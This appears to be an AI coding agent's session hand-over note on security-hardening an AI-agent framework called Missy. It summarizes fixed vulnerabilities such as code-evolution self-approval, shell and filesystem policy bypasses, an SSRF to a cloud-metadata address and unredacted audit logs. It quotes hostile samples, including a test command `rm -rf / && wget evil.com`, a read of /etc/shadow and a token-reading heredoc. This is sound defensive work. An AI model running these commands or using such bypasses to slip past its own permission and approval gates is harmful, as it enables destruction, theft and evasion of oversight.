# LAST_SESSION_SUMMARY

Date: 2026-07-10

Branch: `overhaul/missy-validation-20260710-031406`
Draft PR: https://github.com/MissyLabs/missy/pull/31

## Changed (19 checkpoints this session, full suite green after every one)

### FX-A through FX-G (validation-harness root causes) — condensed, full detail in BUILD_STATUS.md

1. Preserved/hardened the existing `voice_commands.py` fix (real trailing-comma parsing bug found and fixed).
2. **FX-A**: forced the acpx delegate provider through Missy's structured tool protocol (zero native tools, fail-closed permissions, isolated cwd, delegation envelope, leaked-marker defense). Dominant root cause behind ~30 of 43 failing validation cases.
3. **FX-B**: fixed the production memory backend mismatch — Discord conversation turns were being written to the wrong file (JSON store instead of `SQLiteMemoryStore`); identical bug found independently in `VisionMemoryBridge`.
4. **FX-D**: explicit structural current-turn boundary in the acpx prompt + fail-closed on fabricated delegate responses.
5. **FX-C**: grounded memory-ID lookups (exception vs. genuinely missing); confirmed Incus tools are fabrication-proof at the tool layer.
6. **FX-F bullet 1**: browser error classification (tool absence vs. installation vs. sandbox/kernel failure vs. real interaction error).
7. **FX-G**: safe upper bound on acpx timeout config + explicit "outcome is UNKNOWN, verify before retry" messaging. Process-group cleanup attempted but reverted (broke ~136 tests mocking `subprocess.run`) — task #17.

**All of FX-A through FX-G are now done** per the prompt's stated dependency order.

### Thirteen independent, confirmed critical security vulnerabilities (full detail in AUDIT_SECURITY.md)

Found via the same systematic audit against `~/Missy-security-review.md`. Five are "an unauthenticated/unrestricted action reachable due to a missing gate"; the rest are variations — declared tool metadata not matching reality, a security check applied asymmetrically, and enforcement narrower than its own declared scope.

1. **SR-1.2/1.3**: unauthenticated code-evolution self-approval (system prompt taught self-approval; Discord emoji-reaction approval had zero auth check).
2. **SR-1.12**: Discord DM-pairing self-approval bypass (any unpaired stranger, two messages, zero auth).
3. **SR-1.13 (two findings)**: Discord message-command and slash-command ingress both lacked authorization; slash commands also had cross-user session-bleeding (`session_id="discord"` hardcoded for everyone).
4. **SR-1.8**: `ShellPolicyEngine` treated an empty `allowed_commands` list as allow-all whenever `shell.enabled: true`, contradicting its own docstring and all docs. A pre-existing test asserted `rm -rf / && wget evil.com` passed policy under the default config.
5. **SR-1.5**: Incus tools' declared shell permission checked a meaningless dummy string (or, for `incus_exec`, the *guest* command) instead of the real `incus` host binary. Live-reproduced: `incus_exec(command="bash")` with only `"bash"` allowlisted ran the real host `incus exec ... -- bash -c bash`, `incus` never being authorized. Fixed via new `BaseTool.resolve_shell_command()`/`resolve_filesystem_targets()` hooks — a general mechanism, not a one-off patch.
6. **SR-1.6 (crown-jewel bypass)**: `BrowserNavigateTool` called Playwright directly, never routing through `PolicyHTTPClient`/the network policy engine. Live-reproduced: navigating to the cloud-metadata SSRF address `169.254.169.254` passed the registry's permission check with zero denial. Fixed with a `resolve_network_hosts()` hook (registry-level) plus a Playwright `context.route()` interceptor (catches redirects/subresources/JS-triggered fetches too).
7. **SR-1.4**: same pattern as SR-1.5 in `VisionCaptureTool`/`VisionBurstCaptureTool` — declared filesystem permissions but read/write targets (`source`/`save_path`/`device`) didn't match the registry's kwarg heuristic. Live-reproduced: `vision_capture(source="/etc/shadow", ...)` actually called `cv2.imread("/etc/shadow")` with zero policy check. Fixed by reusing SR-1.5's hooks.
8. **SR-1.9a**: `NetworkPolicyEngine`'s exact-hostname/domain-suffix matches allowed immediately with **zero IP verification** — DNS-rebinding defense only applied to *unmatched* hostnames. Live-reproduced with a resolver rigged to raise on any call: an allowlisted hostname passed with the resolver never invoked. Fixed by applying the same rebinding check uniformly. Also caught+fixed a real test-suite performance regression the fix introduced (6 Hypothesis tests doing unmocked live DNS, 75s→383s for affected dirs) and one real full-suite failure (a test hostname resolving via live DNS to an ICANN sentinel loopback address).
9. **SR-1.7**: `ShellPolicyEngine` only validated program names — redirection operators were never routed through the filesystem policy. Live-reproduced through the real production `shell_exec` tool: with only `"echo"` allowlisted and no write paths allowed, `echo pwned > /tmp/.../pwn.txt` **actually wrote the file to disk**. Fixed by tokenising redirect targets with POSIX-punctuation-aware `shlex` and routing them through the filesystem engine. Also found+fixed a pre-existing bug in the same code: `2>&1` was misparsed as a fake sub-command, denying that common idiom outright.
10. **SR-1.10**: `AuditLogger` wrote every event's `detail` to disk completely unredacted — display-time-only redaction elsewhere "can't repair what's already on disk." Live-reproduced: a bearer token, an AWS presigned-URL signature, and a Google-API-key-shaped URL value all appeared in plaintext in the on-disk JSONL file. Fixed with a recursive `_redact_detail()` applied at the single audit-write choke point, plus the two token-shape patterns (`bearer_token`, `basic_auth_header`, `aws_presigned_signature`) the review named explicitly.
11. **SR-1.11**: `McpManager._save_config()` rebuilt every config entry purely from live client state (`name`/`command`/`url`), silently dropping any pinned `digest`. `add_server()` calls `_save_config()` unconditionally after every successful connect, including reconnects, so the very next ordinary restart after a successful `missy mcp pin` erased the pin — no attacker interaction needed. Live-reproduced: pinned a digest, simulated a restart via `connect_all()` on a fresh `McpManager` — the `digest` key was completely gone afterward, and a subsequent tampered manifest would then connect with zero verification and no signal that protection had silently stopped applying. Fixed by having `_save_config()` recover and preserve each server's currently pinned digest from the existing on-disk config before rewriting. Live-verified the digest survives repeated reconnect cycles *and* remains functionally effective — a tampered manifest after a clean reconnect is still correctly denied.
12. **SR-2.4 (first §2 item — unattended-execution hazards)**: `_rewrite_heredoc_command()` wrote a model-supplied `shell_exec` heredoc body to a real temp file *before* the shell policy check (which only happens later inside `registry.execute()`) — no interpreter allowlist check existed in the function at all. Live-reproduced: a heredoc body reading `SUPER_SECRET_TOKEN` from the environment was written to `/tmp/missy_heredoc_*.py` unconditionally, regardless of whether `"python3"` would ever be permitted to execute; the file was also never deleted afterward. Fixed: the interpreter is now checked against the real shell policy (reusing SR-1.7's check) before anything is written — denied/uninitialised-policy cases return the original command unmodified with zero disk footprint — and the temp file path is returned to the caller, which now deletes it in a `finally` block once the tool call completes regardless of outcome. Live-verified: with `"python3"` not allowlisted, zero new files appear on disk at any point.

## Verification

```text
python3 -m pytest tests/ -q -o faulthandler_timeout=120 \
  --deselect tests/vision/test_discovery_capture_sysfs.py::TestCacheTTL::test_cache_valid_within_ttl \
  --deselect tests/vision/test_discovery_edge_cases.py::TestPermissionDeniedOnDevice::test_device_that_does_not_exist_is_skipped \
  --deselect tests/vision/test_discovery_edge_cases.py::TestRapidAddRemove::test_cached_results_returned_within_ttl
20847 passed, 13 skipped, 3 deselected in 443.13s (0:07:23)
```

Full detail in `BUILD_STATUS.md`, `AUDIT_SECURITY.md`, and
`TEST_RESULTS.md` — each has one dated entry per checkpoint this
session, oldest at the bottom, nothing overwritten. (This file was
condensed at checkpoint 17 to stay readable — no information was lost,
it lives in the three files above.)

## Open tasks (session-tracked, carry into next session)

- **#9** SR-1.x through SR-4.x security review remediation — this
  session covered SR-1.2/1.3, SR-1.4, SR-1.5, SR-1.6, SR-1.7, SR-1.8,
  SR-1.9a, SR-1.10, SR-1.11, SR-1.12, SR-1.13, and (first §2 item)
  SR-2.4 (plus SR-3.1 substantially via FX-B). Remaining: SR-1.1 (audit
  signing — larger cross-cutting change), SR-1.9b (DNS TOCTOU,
  substantially harder), SR-2.1 through SR-2.3 (scheduled jobs run
  full-capability, proactive triggers default no-confirmation,
  execution-time tool allow-set not revalidated), SR-3.2 through SR-3.5
  (data-integrity/availability), SR-4.x (dead/unwired features).
- **SR-1.7's launcher sub-finding** remains open — `find`/`xargs`/
  `bash`/`sudo` etc. are allowlist-able with only a warning, and
  nested shell commands inside a launcher's quoted arguments are
  structurally invisible to any static command-string parser
  (confirmed by inspection). This is a product-policy decision (block
  launchers outright vs. runtime interception), not a mechanical bug
  fix — needs explicit product input before implementing.
- **#10** Full 89-case tool-specific validation backlog — not yet
  re-run against current code.
- **#11** Pre-existing vision `CameraDiscovery` cache-TTL flake (3
  tests) — confirmed present before this session's changes, unrelated,
  small isolated fix needed in `missy/vision/discovery.py`.
- **#12** Wire an authenticated Discord pairing approval endpoint —
  the SR-1.12 fix removed the vulnerable path but pairing currently has
  *no* working approval surface at all.
- **#15** `allowed_roles` Discord config field documented but never
  enforced.
- **#16** FX-F bullets 2/4: build an actual disposable, threat-modeled
  browser-test environment and rerun WB-002 through WB-007 + XT-001
  against it. This dev sandbox cannot launch a browser at all (no
  playwright installed) — confirmed live, matching the harness's own
  observation.
- **#17** FX-G process-group cleanup on acpx timeout — implementation
  works but needs the test-suite migration from mocking
  `subprocess.run` to `subprocess.Popen` done carefully in its own
  session.
- **Lesson worth remembering for future policy-engine changes** (from
  SR-1.9a's checkpoint): a security fix that adds real DNS/network
  calls to a previously-synchronous/local code path can silently turn
  into a major test-suite performance regression if fixture hostnames
  aren't mocked — always time the affected test directories before/after
  and grep for realistic-looking hostnames used as allowlist entries in
  tests before considering such a change done.
- **Also noticed, not caused by this session:** an intermittent,
  pre-existing Hypothesis-deadline flake in
  `tests/security/test_property_based_fuzz.py::TestNetworkPolicyEngineFuzz::test_check_host_never_crashes_on_arbitrary_unicode`
  (no `deadline=None`, no DNS mock, occasional slow live
  `socket.getaddrinfo()` call trips the 200ms default). Confirmed via
  `git show HEAD~5` this file predates the session and never touches
  SR-1.9a's changed code paths. Not fixed — same category as the
  already-tracked vision flake (task #11); consider bundling both into
  one small follow-up task.

## The single biggest remaining gap

**None of this session's fixes have been validated against a real or
scripted acpx delegate invocation.** All verification so far is
unit/integration-level with mocks, or against the real (but
non-LLM-calling) acpx binary for `--version`/`--help`. FX-A bullet 6
("prove end to end that representative filesystem, shell, browser,
X11, AT-SPI, vision, audio, Discord upload, memory, self_create_tool,
and code_evolve requests produce the expected registry, policy, and
audit events") is still fully open, and it's the prerequisite for
re-running most of the 89-case validation backlog with real evidence
rather than code-level reasoning about what *should* happen.

## First Next Step

If a way to safely exercise a real or scripted acpx delegate call
becomes available, prioritize FX-A bullet 6 — it unblocks re-validating
everything else. Otherwise, the SR-1.x sweep has now covered every
tractable "wired & reachable" §1 finding from the review, and §2 has
its first item done (SR-2.4). SR-2.1 through SR-2.3 (scheduled jobs
default to full capability mode, proactive triggers default to
no-confirmation with no gate wired, execution-time tool allow-set not
revalidated mid-loop) are the natural next targets — all three are
concrete, well-described findings with clear reproduction paths named
in the review. SR-1.1 (audit signing) remains the largest §1 item;
§3/§4 (data-integrity/availability, dead/unwired features) follow after
§2. Alternatively pick up one of the concrete scoped tasks above (#11,
#12, #15, #16, #17), all self-contained and not requiring a live
delegate.
